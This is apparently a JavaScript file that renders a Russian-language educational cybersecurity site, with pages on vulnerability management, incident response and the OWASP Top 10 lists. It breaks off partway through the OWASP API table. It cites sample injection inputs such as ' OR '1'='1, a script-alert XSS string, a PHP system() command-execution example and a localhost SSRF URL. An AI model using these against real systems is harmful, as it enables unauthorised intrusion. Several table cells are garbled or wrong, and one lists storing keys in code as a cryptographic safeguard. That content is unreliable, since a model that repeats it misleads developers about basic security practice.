function loadVulnerabilitiesContent(container) {
  container.innerHTML = `
    <div class="vulnerabilities-container">
      <h1>Уязвимости</h1>
      <div class="osi-table-container">
        <table class="osi-table">
          <thead>
            <tr>
              <th>Подход</th>
              <th>Описание</th>
              <th>Пример применения</th>
              <th>Рекомендации</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td>Анализ CVE (Common Vulnerabilities and Exposures)</td>
              <td>Изучение известных уязвимостей в системах, используя автоматизированные инструменты для поиска известных уязвимостей в системе.</td>
              <td>Проверка, уязвима ли система к Log4Shell (CVE-2021-44228).</td>
              <td>Использовать базы данных NVD, провести CVSS-оценку, обновлять критические уязвимости.</td>
            </tr>
            <tr>
              <td>Оценка по CWE (Common Weakness Enumeration)</td>
              <td>Анализ слабостей в коде или архитектуре, которые могут привести к уязвимостям (например, XSS).</td>
              <td>Проверка кода на CWE-79 (XSS) с помощью статического анализа (SonarQube).</td>
              <td>Использовать CWE Top 25 для приоритизации, внедрять практики безопасной разработки (Secure SDLC).</td>
            </tr>
            <tr>
              <td>Оценка по CVSS (Common Vulnerability Scoring System)</td>
              <td>Оценка серьёзности уязвимостей по шкале от 0 до 10 на основе воздействия и сложности атаки.</td>
              <td>Уязвимость с CVSS 9.8 (критическая) требует немедленного устранения.</td>
              <td>Приоритизировать уязвимости с высоким CVSS (7+), учитывать контекст (например, доступность эксплойта).</td>
            </tr>
            <tr>
              <td>MITRE ATT&CK</td>
              <td>Анализ тактик и техник атак (TTP) для понимания, как уязвимости могут быть использованы для Initial Access (T1190).</td>
              <td>Анализ, как уязвимость может быть использована для Initial Access (T1190).</td>
              <td>Использовать MITRE ATT&CK для модели угроз, разрабатывать сценарии защиты (например, WAF).</td>
            </tr>
            <tr>
              <td>Threat Modeling (моделирование угроз)</td>
              <td>Выявление потенциальных угроз на этапе проектирования системы.</td>
              <td>Определение, что API уязвим к SSRF, добавление защиты.</td>
              <td>Применять STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, DoS, Elevation of Privilege).</td>
            </tr>
            <tr>
              <td>Анализ рисков (Risk Assessment)</td>
              <td>Оценка вероятности и воздействия угроз для определения приоритетов.</td>
              <td>Risk утечки данных из-за XSS оценивается как высокий из-за публичного доступа.</td>
              <td>Использовать формулу: Risk = Вероятность × Воздействие, фокусироваться на высоких рисках.</td>
            </tr>
            <tr>
              <td>Пентест (Penetration Testing)</td>
              <td>Имитация атак для выявления уязвимостей в реальных условиях.</td>
              <td>Пентест выявил возможность SQL-инъекции в веб-приложении.</td>
              <td>Проводить регулярные пентесты, использовать сертифицированных специалистов, устранять уязвимости.</td>
            </tr>
            <tr>
              <td>Анализ логов и мониторинг</td>
              <td>Анализ логов для выявления признаков эксплуатации уязвимостей.</td>
              <td>Обнаружение попыток брутфорса через логи SIEM (Splunk).</td>
              <td>Настраивать систему NetFlow для анализа трафика, реагировать на инциденты.</td>
            </tr>
          </tbody>
        </table>
      </div>

      <div class="vulnerabilities-buttons">
        <button class="network-btn" id="incident-response-btn">Реагирование на инциденты (IR)</button>
        <button class="network-btn" id="owasp-btn">OWASP</button>
        <button class="network-btn" id="cwe-btn">CWE</button>
        <button class="network-btn" id="cve-btn">CVE</button>
        <button class="network-btn" id="cvss-btn">CVSS</button>
        <button class="network-btn" id="mitre-attck-btn">MITRE ATT&CK</button>
        <button class="network-btn" id="zta-btn">ZTA</button>
        <button class="network-btn" id="bdu-fstec-btn">БДУ ФСТЭК</button>
        <button class="network-btn" id="language-vulnerabilities-btn">Уязвимости языков</button>
      </div>

      <h2>Дополнительная информация</h2>
      <p><strong>Что такое уязвимости?</strong> Уязвимость в контексте информационной безопасности — это слабое место в программном обеспечении, оборудовании, процессах или конфигурации системы, которое может быть использовано злоумышленником для компрометации системы. Уязвимости могут возникать из-за ошибок в коде, неправильной настройки, устаревшего ПО или недостатков в архитектуре системы.</p>
      <p>Уязвимости классифицируются по различным критериям:</p>
      <ul>
        <li><strong>По типу:</strong> программные (например, SQL-инъекции), аппаратные (например, Spectre/Meltdown), сетевые (например, уязвимости в протоколах).</li>
        <li><strong>По воздействию:</strong> удалённое выполнение кода (RCE), утечка данных, отказ в обслуживании (DoS), повышение привилегий.</li>
        <li><strong>По источнику:</strong> ошибки разработчиков, сторонние библиотеки, конфигурационные ошибки.</li>
      </ul>

      <h3>Жизненный цикл уязвимости</h3>
      <p>Уязвимости проходят несколько стадий в своём жизненном цикле:</p>
      <ul>
        <li><strong>Обнаружение:</strong> Уязвимость выявляется исследователем, разработчиком или злоумышленником (например, через fuzzing или аудит кода).</li>
        <li><strong>Раскрытие:</strong> Информация об уязвимости публикуется (например, в CVE) или передаётся вендору для исправления.</li>
        <li><strong>Эксплуатация:</strong> Злоумышленники создают эксплойты для использования уязвимости (например, эксплойт для Log4Shell был опубликован через несколько дней после раскрытия).</li>
        <li><strong>Исправление:</strong> Вендор выпускает патч, а организации его применяют (например, патч для <code>CVE-2021-44228</code> от Apache).</li>
        <li><strong>Устаревание:</strong> Уязвимость становится неактуальной из-за обновлений или прекращения поддержки ПО.</li>
      </ul>

      <h3>Теория поиска уязвимостей</h3>
      <p>Поиск уязвимостей — это процесс выявления слабых мест в системах или коде. В научных целях он проводится в контролируемых средах с разрешения владельцев систем, чтобы не нарушать законодательство РФ (например, ст. 272 УК РФ "Неправомерный доступ к компьютерной информации").</p>
      <ul>
        <li><strong>Статический анализ:</strong> Используются инструменты (SonarQube, Bandit, RIPS) для анализа кода без его выполнения. Пример: поиск <code>eval($_GET['cmd'])</code> в PHP для выявления RCE.</li>
        <li><strong>Динамический анализ:</strong> Тестирование работающего приложения с помощью сканеров (Burp Suite, OWASP ZAP). Пример: отправка <code>' OR '1'='1</code> для проверки SQL-инъекций.</li>
        <li><strong>Fuzzing:</strong> Генерация случайных данных для проверки поведения системы. Пример: отправка длинных строк для выявления переполнения буфера.</li>
        <li><strong>Ручной аудит:</strong> Анализ кода или конфигурации на наличие опасных функций (например, <code>strcpy</code> в C) или слабых настроек (открытые порты).</li>
        <li><strong>Использование баз данных:</strong> Проверка систем на известные уязвимости через CVE (NVD) или БДУ ФСТЭК.</li>
      </ul>
      <p><strong>Пример:</strong> В тестовой среде с разрешения владельца можно проверить веб-приложение на XSS, отправив <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> в поле ввода, чтобы изучить фильтрацию данных.</p>

      <h3>Теория эксплуатации уязвимостей (в научных целях)</h3>
      <p>Эксплуатация уязвимостей изучается для понимания механизмов атак и разработки защиты. Все действия должны проводиться в легальных тестовых средах с явного согласия владельцев систем, чтобы соответствовать законодательству РФ.</p>
      <ul>
        <li><strong>SQL-инъекции:</strong> Ввод специальных символов (например, <code>' OR '1'='1</code>) для изменения запроса. Пример: в тестовой среде проверка <code>SELECT * FROM users WHERE id = '$input'</code>.</li>
        <li><strong>XSS:</strong> Внедрение скриптов (<code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>) для выполнения кода в браузере жертвы.</li>
        <li><strong>RCE:</strong> Использование уязвимых функций (например, <code>system($_GET['cmd'])</code> в PHP) для выполнения команд. Пример: в тестовой среде подставить <code>whoami</code>.</li>
        <li><strong>Переполнение буфера:</strong> Отправка данных сверх выделенной памяти для изменения выполнения программы. Пример: в C-программе с <code>strcpy</code> отправить длинную строку.</li>
        <li><strong>SSRF:</strong> Подстановка URL (например, <code>http://localhost</code>) для доступа к внутренним ресурсам в тестовой среде.</li>
      </ul>
      <p><strong>Этика и закон:</strong> Эксплуатация вне тестовой среды без разрешения — нарушение УК РФ. Используйте виртуальные машины (например, TryHackMe, Hack The Box) для практики.</p>

      <h3>Теория закрытия уязвимостей</h3>
      <p>Закрытие уязвимостей — это процесс устранения слабых мест для предотвращения атак. Основной принцип — минимизация рисков и обеспечение безопасности.</p>
      <ul>
        <li><strong>Патчинг:</strong> Установка обновлений ПО для устранения известных уязвимостей (например, обновление Apache для Log4Shell).</li>
        <li><strong>Фильтрация ввода:</strong> Проверка и экранирование данных (например, <code>htmlspecialchars()</code> в PHP для защиты от XSS).</li>
        <li><strong>Параметризация запросов:</strong> Использование подготовленных выражений в SQL (например, PDO в PHP) для защиты от SQLi.</li>
        <li><strong>Ограничение доступа:</strong> Настройка прав (chmod, ACL), закрытие ненужных портов, использование WAF.</li>
        <li><strong>Безопасные функции:</strong> Замена уязвимых функций (<code>strcpy</code> → <code>strncpy</code> в C, избегание <code>eval()</code>).</li>
        <li><strong>Шифрование:</strong> Использование HTTPS, шифрование данных в БД (AES-256).</li>
        <li><strong>Мониторинг:</strong> Настройка SIEM (Splunk, ELK) для обнаружения попыток эксплуатации.</li>
      </ul>
      <p><strong>Пример:</strong> Для защиты от SQLi в PHP замените <code>mysql_query("SELECT * FROM users WHERE id = '$id'")</code> на <code>$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id"); $stmt->execute(['id' => $id]);</code>.</p>

      <h3>Почему управление уязвимостями важно?</h3>
      <p>Управление уязвимостями — это критически важный процесс в кибербезопасности, который помогает:</p>
      <ul>
        <li><strong>Снизить риски:</strong> Устранение уязвимостей предотвращает атаки, такие как утечка данных или ransomware.</li>
        <li><strong>Соответствовать требованиям:</strong> Многие стандарты (например, PCI DSS, ISO 27001, GDPR) требуют регулярного управления уязвимостями.</li>
        <li><strong>Защитить репутацию:</strong> Утечка данных из-за уязвимости может нанести ущерб репутации компании (например, утечка данных Equifax в 2017 году из-за <code>CVE-2017-5638</code>).</li>
        <li><strong>Снизить затраты:</strong> Проактивное устранение уязвимостей дешевле, чем восстановление после инцидента.</li>
        <li><strong>Обеспечить непрерывность бизнеса:</strong> Уязвимости, такие как DoS, могут остановить бизнес-процессы.</li>
      </ul>

      <h3>История развития угроз</h3>
      <p>Угрозы информационной безопасности эволюционировали вместе с развитием технологий:</p>
      <ul>
        <li><strong>1980-е годы:</strong> Появление первых компьютерных вирусов, таких как Brain (1986), которые распространялись через дискеты.</li>
        <li><strong>1990-е годы:</strong> Рост числа сетевых атак с развитием интернета. Вирус Melissa (1999) показал, как быстро вредоносное ПО может распространяться через email.</li>
        <li><strong>2000-е годы:</strong> Появление сложных атак, таких как SQL Slammer (2003), который использовал уязвимость в Microsoft SQL Server (<code>CVE-2002-0649</code>), заражая 75 000 систем за 10 минут.</li>
        <li><strong>2010-е годы:</strong> Эпоха APT-атак (Advanced Persistent Threats). Атака Stuxnet (2010) использовала несколько 0-day уязвимостей для атаки на промышленные системы. Утечка данных Equifax (2017) из-за <code>CVE-2017-5638</code> затронула 147 миллионов человек.</li>
        <li><strong>2020-е годы:</strong> Рост числа атак на цепочки поставок (supply chain attacks). Атака SolarWinds (2020) использовала уязвимость в ПО Orion, затронув тысячи организаций. Log4Shell (<code>CVE-2021-44228</code>, 2021) показал, как уязвимость в широко используемой библиотеке может стать глобальной угрозой.</li>
      </ul>
      <p>Эволюция уязвимостей также связана с ростом сложности систем. Если в 1990-х годах уязвимости были простыми (например, переполнение буфера), то сегодня злоумышленники используют сложные цепочки эксплуатации, комбинируя несколько уязвимостей (например, цепочка в Log4Shell: JNDI-инъекция → LDAP-запрос → выполнение кода).</p>
      <p>Цифровизация и интернет вещей (IoT) увеличили число уязвимостей. По данным NIST, в 2023 году было зарегистрировано более 26 000 новых CVE, что на 25% больше, чем в 2020 году. Устройства IoT, такие как умные камеры и роутеры, часто имеют слабую защиту, что делает их мишенями для атак (например, ботнет Mirai в 2016 году).</p>

      <h3>Современные вызовы и тренды</h3>
      <p>Управление уязвимостями сталкивается с новыми вызовами:</p>
      <ul>
        <li><strong>Рост числа уязвимостей в открытом ПО:</strong> Библиотеки, такие как Log4j, широко используются, но часто содержат уязвимости (например, Log4Shell).</li>
        <li><strong>Облачные системы:</strong> Неправильная конфигурация облаков (например, открытые S3-бакеты в AWS) приводит к утечкам данных.</li>
        <li><strong>Устройства IoT и 5G:</strong> Рост числа подключённых устройств увеличивает поверхность атаки. Уязвимости в 5G-протоколах могут затронуть миллионы устройств.</li>
        <li><strong>ИИ в руках злоумышленников:</strong> ИИ используется для автоматизации атак, таких как фишинг или генерация эксплойтов (например, использование ChatGPT для создания вредоносного кода).</li>
        <li><strong>Атаки на цепочки поставок:</strong> Атаки, такие как SolarWinds, показывают, как уязвимости в стороннем ПО могут затронуть тысячи организаций.</li>
        <li><strong>Нехватка специалистов:</strong> По данным (ISC)², в 2023 году дефицит специалистов по кибербезопасности составил 3,4 миллиона человек, что затрудняет своевременное устранение уязвимостей.</li>
      </ul>

      <h3>Подходы к управлению уязвимостями</h3>
      <p>Эффективное управление уязвимостями требует комплексного подхода, включающего как технические меры (сканирование, патчинг), так и организационные (обучение сотрудников, внедрение Secure SDLC). Важно также учитывать стандарты, такие как ISO 27001, NIST 800-53 и OWASP Top 10, для построения зрелой программы управления уязвимостями.</p>
    </div>
  `;

  document.getElementById('incident-response-btn').addEventListener('click', () => {
    loadIncidentResponseContent(container);
  });

  document.getElementById('owasp-btn').addEventListener('click', () => {
    loadOWASPContent(container);
  });

  document.getElementById('cwe-btn').addEventListener('click', () => {
    loadCweContent(container);
  });

  document.getElementById('cve-btn').addEventListener('click', () => {
    loadCveContent(container);
  });

  document.getElementById('cvss-btn').addEventListener('click', () => {
    loadCvssContent(container);
  });

  document.getElementById('mitre-attck-btn').addEventListener('click', () => {
    loadMitreAttckContent(container);
  });

  document.getElementById('zta-btn').addEventListener('click', () => {
    loadZtaContent(container);
  });

  document.getElementById('bdu-fstec-btn').addEventListener('click', () => {
    loadBduFstecContent(container);
  });

  document.getElementById('language-vulnerabilities-btn').addEventListener('click', () => {
    loadLanguageVulnerabilitiesContent(container);
  });
}

function loadIncidentResponseContent(container) {
    container.innerHTML = `
      <div class="vulnerabilities-container">
        <button class="back-btn">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <line x1="19" y1="12" x2="5" y2="12"></line>
            <polyline points="12 19 5 12 12 5"></polyline>
          </svg>
          Назад
        </button>
        <h1>Реагирование на инциденты (IR)</h1>
        <div class="ir-description">
          <p><strong>Реагирование на инциденты (Incident Response, IR)</strong> — это структурированный процесс управления и устранения последствий кибератак или инцидентов безопасности. Основная цель IR — минимизировать ущерб, восстановить нормальную работу систем и предотвратить повторные инциденты. IR включает в себя выявление, анализ, сдерживание, устранение и восстановление после инцидента, а также извлечение уроков для улучшения безопасности.</p>

          <h2>Зачем нужен Incident Response?</h2>
          <p>Реагирование на инциденты необходимо по нескольким причинам:</p>
          <ul>
            <li><strong>Снижение ущерба:</strong> Быстрое реагирование позволяет минимизировать финансовые, репутационные и операционные потери от кибератак.</li>
            <li><strong>Соответствие требованиям:</strong> Многие стандарты и законы (например, GDPR, HIPAA, PCI DSS) требуют наличия плана IR для защиты данных и уведомления о нарушениях.</li>
            <li><strong>Предотвращение повторных атак:</strong> Анализ инцидентов помогает выявить слабые места и устранить их, чтобы избежать повторных инцидентов.</li>
            <li><strong>Повышение осведомлённости:</strong> IR способствует обучению сотрудников и улучшению процессов безопасности в организации.</li>
            <li><strong>Оперативное восстановление:</strong> Эффективный IR позволяет быстрее восстановить нормальную работу систем и минимизировать простои.</li>
          </ul>

          <h2>Этапы Incident Response</h2>
          <p>Процесс IR обычно делится на несколько этапов, которые основаны на стандартах, таких как NIST SP 800-61 ("Computer Security Incident Handling Guide") и SANS Institute. Эти этапы включают:</p>
          <ul>
            <li><strong>Подготовка:</strong> Создание плана IR, обучение команды, настройка инструментов.</li>
            <li><strong>Обнаружение и анализ:</strong> Выявление инцидента, сбор данных, определение его масштаба.</li>
            <li><strong>Сдерживание:</strong> Ограничение распространения инцидента (например, изоляция заражённых систем).</li>
            <li><strong>Устранение:</strong> Удаление угрозы и устранение уязвимостей.</li>
            <li><strong>Восстановление:</strong> Возвращение систем в нормальное состояние.</li>
            <li><strong>Анализ уроков:</strong> Извлечение уроков для предотвращения будущих инцидентов.</li>
          </ul>

          <h2>Стандарты и методологии</h2>
          <p>Существуют несколько признанных стандартов и методологий для IR:</p>
          <ul>
            <li><strong>NIST SP 800-61:</strong> Руководство по обработке инцидентов от Национального института стандартов и технологий (NIST). Описывает этапы IR и лучшие практики.</li>
            <li><strong>SANS Institute:</strong> Предлагает шестиэтапный процесс IR, включая подготовку, обнаружение, сдерживание, устранение, восстановление и анализ уроков.</li>
            <li><strong>ISO/IEC 27035:</strong> Международный стандарт по управлению инцидентами информационной безопасности.</li>
            <li><strong>MITRE ATT&CK:</strong> Используется для анализа тактик и техник атак, чтобы лучше понимать инциденты и разрабатывать меры реагирования.</li>
          </ul>

          <h2>Преимущества эффективного IR</h2>
          <p>Эффективное реагирование на инциденты приносит следующие преимущества:</p>
          <ul>
            <li><strong>Быстрое реагирование:</strong> Сокращение времени реакции на инциденты, что снижает их воздействие.</li>
            <li><strong>Улучшение безопасности:</strong> Выявление и устранение уязвимостей, которые привели к инциденту.</li>
            <li><strong>Снижение затрат:</strong> Минимизация финансовых потерь за счёт быстрого восстановления.</li>
            <li><strong>Соответствие требованиям:</strong> Выполнение нормативных требований и защита репутации компании.</li>
            <li><strong>Повышение доверия:</strong> Демонстрация клиентам и партнёрам, что организация серьёзно относится к безопасности.</li>
          </ul>

          <h2>Области применения</h2>
          <p>IR применяется в различных сценариях:</p>
          <ul>
            <li><strong>Кибератаки:</strong> Реагирование на атаки, такие как фишинг, ransomware, DDoS.</li>
            <li><strong>Утечки данных:</strong> Управление инцидентами, связанными с утечкой конфиденциальной информации.</li>
            <li><strong>Эксплуатация уязвимостей:</strong> Реакция на использование известных уязвимостей (например, Log4Shell).</li>
            <li><strong>Внутренние угрозы:</strong> Обнаружение и устранение инцидентов, вызванных действиями сотрудников (например, утечка данных).</li>
            <li><strong>Соответствие требованиям:</strong> Проведение IR в рамках аудитов и сертификаций.</li>
          </ul>

          <p>Ниже представлена таблица с этапами реагирования на инциденты, их описанием, примерами применения, особенностями и рекомендациями.</p>
        </div>

        <div class="osi-table-container">
          <table class="osi-table">
            <thead>
              <tr>
                <th>Этап</th>
                <th>Описание</th>
                <th>Пример применения</th>
                <th>Особенности</th>
                <th>Рекомендации</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td><strong>Подготовка</strong></td>
                <td>Создание плана IR, обучение команды, настройка инструментов для мониторинга и анализа логов.</td>
                <td>Разработка плана IR, настройка SIEM (Splunk) для обучения команды, обучение брутфорса через логи Splunk, множество неудачных попыток входа.</td>
                <td>- Имеет IR, должен быть чётко задокументирован.<br>- Команда должна быть обучена, инструменты настроены (SIEM, IDS/IPS, NetFlow).<br>- Регулярные учения (tabletop exercises).</td>
                <td>- Разработать план IR (по NIST 800-61).<br>- Проводить тренировки (tabletop exercises).<br>- Настроить SIEM, IDS/IPS.<br>- Использовать SIEM для анализа логов.<br>- Проводить обучение на аномалии.<br>- Программы IOC (например, через VirusTotal).</td>
              </tr>
              <tr>
                <td><strong>Обнаружение и анализ</strong></td>
                <td>Выявление инцидента через мониторинг и анализ логов.</td>
                <td>Обнаружение брутфорса через логи Splunk, множество неудачных попыток входа.</td>
                <td>- Использовать SIEM, IDS/IPS, аналитику NetFlow.<br>- Классифицировать инцидент (IOC).<br>- Точность анализа (ложные срабатывания).</td>
                <td>- Использовать SIEM для анализа логов.<br>- Настроить оповещения на аномалии.<br>- Проводить IOC (например, через VirusTotal).</td>
              </tr>
              <tr>
                <td><strong>Сдерживание</strong></td>
                <td>Ограничение распространения инцидента (краткосрочное и долгосрочное).</td>
                <td>Изоляция заражённого сервера через фаервол, отключение учётной записи.</td>
                <td>- Краткосрочные меры: изоляция сети.<br>- Долгосрочные: патчи, обновление паролей.</td>
                <td>- Изолировать системы быстро.<br>- Сохранять улики (логи, дампы памяти).<br>- Документировать действия.</td>
              </tr>
              <tr>
                <td><strong>Устранение</strong></td>
                <td>Устранение причины инцидента и уязвимостей в системе.</td>
                <td>Устранение плана для Log4Shell (CVE-2021-44228).</td>
                <td>- Устранение уязвимостей.<br>- Проверка на повторные атаки.<br>- Восстановление заражённых данных.</td>
                <td>- Устранять уязвимости (патчи, обновления).<br>- Проверять системы на повторные атаки.<br>- Программы системы после устранения.</td>
              </tr>
              <tr>
                <td><strong>Восстановление</strong></td>
                <td>Восстановление систем в рабочее состояние, проверка целостности, мониторинг после атаки.</td>
                <td>Восстановление веб-сервера после атаки, проверка работоспособности.</td>
                <td>- Проверка целостности.<br>- Мониторинг на повторные атаки.</td>
                <td>- Мониторить на аномалии.<br>- Обновить политики и процедуры.<br>- Проверять целостность.</td>
              </tr>
              <tr>
                <td><strong>Анализ уроков</strong></td>
                <td>Анализ инцидента, извлечение уроков, обновление плана IR.</td>
                <td>Анализ DDoS-атаки, добавление Rate Limiting в план IR.</td>
                <td>- Документировать уроки.<br>- Улучшение плана IR.<br>- Обучение команды.</td>
                <td>- Документировать уроки.<br>- Проводить ретроспективу.<br>- Обновить план IR на уроках.</td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>
    `;

    document.querySelector('.back-btn').addEventListener('click', () => {
      loadVulnerabilitiesContent(container);
    });
}

function loadOWASPContent(container) {
    container.innerHTML = `
      <div class="vulnerabilities-container">
        <button class="back-btn">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <line x1="19" y1="12" x2="5" y2="12"></line>
            <polyline points="12 19 5 12 12 5"></polyline>
          </svg>
          Назад
        </button>
        <h1>OWASP</h1>
        <div class="owasp-description">
          <p><strong>OWASP (Open Web Application Security Project)</strong> — это международная некоммерческая организация, основанная в 2001 году, которая занимается повышением безопасности программного обеспечения. OWASP предоставляет свободно доступные ресурсы, инструменты, документацию и методологии для разработчиков, специалистов по безопасности и организаций, чтобы помочь им создавать защищённые приложения и защищаться от киберугроз.</p>
          
          <h2>Зачем нужен OWASP?</h2>
          <p>OWASP играет ключевую роль в области кибербезопасности, так как:</p>
          <ul>
            <li><strong>Стандартизация знаний:</strong> OWASP собирает и систематизирует информацию о наиболее распространённых уязвимостях, предоставляя единый источник знаний для специалистов по всему миру.</li>
            <li><strong>Обучение и осведомлённость:</strong> Организация помогает разработчикам и компаниям понимать риски, связанные с уязвимостями, и учит, как их предотвращать.</li>
            <li><strong>Практические рекомендации:</strong> OWASP публикует списки уязвимостей (например, OWASP Top 10) и предлагает конкретные шаги по их устранению, что делает её ресурсы применимыми на практике.</li>
            <li><strong>Сообщество:</strong> OWASP объединяет экспертов по безопасности со всего мира, что способствует обмену опытом и разработке новых решений.</li>
          </ul>

          <h2>Почему используют OWASP?</h2>
          <p>OWASP широко используется в индустрии по нескольким причинам:</p>
          <ul>
            <li><strong>Авторитетность:</strong> OWASP признан мировым стандартом в области безопасности приложений. Его списки, такие как OWASP Top 10, часто используются в качестве основы для аудитов и сертификаций (например, PCI DSS).</li>
            <li><strong>Доступность:</strong> Все ресурсы OWASP бесплатны и открыты, что делает их доступными для компаний любого размера, включая стартапы.</li>
            <li><strong>Актуальность:</strong> OWASP регулярно обновляет свои списки и инструменты, учитывая новые угрозы и изменения в технологиях (например, рост популярности API привёл к созданию OWASP API Security Top 10).</li>
            <li><strong>Универсальность:</strong> Рекомендации OWASP применимы к различным типам приложений — веб, мобильным, API, облачным и другим.</li>
          </ul>

          <h2>История и влияние</h2>
          <p>OWASP был основан в 2001 году Марком Курчером (Mark Curphey) с целью создания открытого сообщества для обмена знаниями о безопасности приложений. Первый список OWASP Top 10 был опубликован в 2003 году и с тех пор обновляется каждые 3-4 года. Сегодня OWASP насчитывает тысячи участников по всему миру, включая локальные отделения (chapters), конференции и проекты, такие как OWASP ZAP (инструмент для тестирования уязвимостей) и OWASP Cheat Sheets (практические руководства).</p>
          <p>OWASP оказал значительное влияние на индустрию, став основой для многих стандартов безопасности, таких как NIST, ISO 27001 и другие. Компании используют OWASP для обучения сотрудников, проведения пентестов и внедрения практик безопасной разработки (Secure SDLC).</p>

          <h2>Области применения</h2>
          <p>Ресурсы OWASP применяются в различных аспектах кибербезопасности:</p>
          <ul>
            <li><strong>Разработка:</strong> Интеграция принципов безопасного кода (например, OWASP Secure Coding Practices) на этапе разработки.</li>
            <li><strong>Тестирование:</strong> Использование инструментов OWASP (например, OWASP ZAP, Dependency-Check) для выявления уязвимостей.</li>
            <li><strong>Аудит:</strong> Проведение аудитов безопасности на основе OWASP Top 10 и других списков.</li>
            <li><strong>Обучение:</strong> Проведение тренингов для разработчиков и специалистов по безопасности с использованием материалов OWASP.</li>
          </ul>

          <p>В данном разделе представлены три ключевых списка OWASP: <strong>OWASP Top 10 (2021)</strong> для веб-приложений, <strong>OWASP API Security Top 10 (2023)</strong> для API и <strong>OWASP Mobile Top 10 (2016)</strong> для мобильных приложений. Эти списки помогают сосредоточиться на наиболее критичных уязвимостях в соответствующих областях.</p>
        </div>

        <div class="accordion">
          <!-- OWASP Top 10 (2021) -->
          <div class="accordion-item">
            <button class="accordion-header">OWASP Top 10 (2021)</button>
            <div class="accordion-content">
              <div class="osi-table-container">
                <table class="osi-table">
                  <thead>
                    <tr>
                      <th>Категория</th>
                      <th>Описание</th>
                      <th>Пример атаки</th>
                      <th>Методы предотвращения</th>
                    </tr>
                  </thead>
                  <tbody>
                    <tr>
                      <td><strong>A01: Broken Access Control</strong></td>
                      <td>Нарушение доступа, пользователь получает доступ к чужим данным.</td>
                      <td>Перехват чужого user_id в URL, изменение значения.</td>
                      <td>Проверять доступ на серверной стороне для каждого объекта.</td>
                    </tr>
                    <tr>
                      <td><strong>A02: Cryptographic Failures</strong></td>
                      <td>Уязвимости в шифровании, отсылающие открытые HTTPS, слабые алгоритмы, отсутствие TLS.</td>
                      <td>Перехват данных из-за отсутствия HTTPS или использования протокола TLS.</td>
                      <td>Использовать HTTPS, современные алгоритмы шифрования (AES, SHA-256), хранить ключи в коде.</td>
                    </tr>
                    <tr>
                      <td><strong>A03: Injection</strong></td>
                      <td>Введение вредоносного кода (SQL, XSS, Command Injection).</td>
                      <td>SQL-инъекция: SELECT * FROM users WHERE id = '1' OR '1'='1'.</td>
                      <td>Использовать подготовленные выражения (Prepared Statements), экранировать ввод.</td>
                    </tr>
                    <tr>
                      <td><strong>A04: Insecure Design</strong></td>
                      <td>Ошибки проектирования, приводящие к уязвимостям (например, отсутствие MFA).</td>
                      <td>Отсутствие MFA позволяет легко подобрать пароль через брутфорс.</td>
                      <td>Применять принципы безопасного проектирования (Secure by Design), Threat Modeling.</td>
                    </tr>
                    <tr>
                      <td><strong>A05: Security Misconfiguration</strong></td>
                      <td>Неверная конфигурация (например, отсутствие MFA), потенциальные уязвимости (открытые порты).</td>
                      <td>Сервер с доступом по паролю admin/admin.</td>
                      <td>Отключать ненужные функции, регулярно обновлять ПО, использовать безопасные настройки.</td>
                    </tr>
                    <tr>
                      <td><strong>A06: Vulnerable and Outdated Components</strong></td>
                      <td>Использование устаревших библиотек с известными уязвимостями.</td>
                      <td>Apache Struts.</td>
                      <td>Регулярно обновлять зависимости, использовать инструменты (например, OWASP Dependency-Check).</td>
                    </tr>
                    <tr>
                      <td><strong>A07: Identification and Authentication Failures</strong></td>
                      <td>Проблемы с аутентификацией (слабые пароли, отсутствие блокировки).</td>
                      <td>Брутфорс пароля из-за отсутствия блокировки после 3 попыток.</td>
                      <td>Использовать MFA, блокировать учётные записи после нескольких попыток, хранить пароли в хэшах (bcrypt).</td>
                    </tr>
                    <tr>
                      <td><strong>A08: Software and Data Integrity Failures</strong></td>
                      <td>Нагрузка целостности ПО или данных (например, отсутствие проверки).</td>
                      <td>Внедрение вредоносного кода через обновление ПО.</td>
                      <td>Использовать подписи, проверять целостность ПО, проверять обновления.</td>
                    </tr>
                    <tr>
                      <td><strong>A09: Security Logging and Monitoring Failures</strong></td>
                      <td>Отсутствие или недостаточное логирование активности.</td>
                      <td>Атака не фиксируется из-за отсутствия логов.</td>
                      <td>Включать логирование всех запросов, настроить мониторинг (SIEM), реагировать на инциденты.</td>
                    </tr>
                    <tr>
                      <td><strong>A10: Server-Side Request Forgery (SSRF)</strong></td>
                      <td>Сервер запрашивает серверную часть от имени злоумышленника.</td>
                      <td>SSRF-запрос к внутреннему серверу.</td>
                      <td>Ограничивать доступ к URL, использовать белые списки, проверять запросы.</td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </div>
          </div>

          <!-- OWASP API Security Top 10 (2023) -->
          <div class="accordion-item">
            <button class="accordion-header">OWASP API Security Top 10 (2023)</button>
            <div class="accordion-content">
              <div class="osi-table-container">
                <table class="osi-table">
                  <thead>
                    <tr>
                      <th>Категория</th>
                      <th>Описание</th>
                      <th>Пример атаки</th>
                      <th>Методы предотвращения</th>
                    </tr>
                  </thead>
                  <tbody>
                    <tr>
                      <td><strong>API1: Broken Object Level Authorization (BOLA)</strong></td>
                      <td>Злоумышленник получает доступ к объектам, изменяя идентификаторы в запросах, из-за отсутствия проверки прав доступа на уровне объекта.</td>
                      <td>Злоумышленник меняет user_id в запросе /api/users/123 на /api/users/456 и получает доступ к данным другого пользователя.</td>
                      <td>- Проверять права доступа на серверной стороне для каждого объекта.<br>- Использовать RBAC (Role-Based Access Control) или ABAC (Attribute-Based Access Control).<br>- Применять UUID вместо последовательных ID для объектов.</td>
                    </tr>
                    <tr>
                      <td><strong>API2: Broken Authentication</strong></td>
                      <td>Уязвимость в механизмах аутентификации API, таких как слабые токены, отсутствие MFA или неправильное хранение сессий.</td>
                      <td>Перехват JWT-токена из-за отсутствия HTTPS или использование API-ключа для низкоуровневых сессий.</td>
                      <td>- Использовать HTTPS для защиты передачи данных.<br>- Внедрить MFA (многофакторную аутентификацию).<br>- Применять безопасные токены (короткий срок действия, подписи, например, HS256/RS256 для JWT).</td>
                    </tr>
                    <tr>
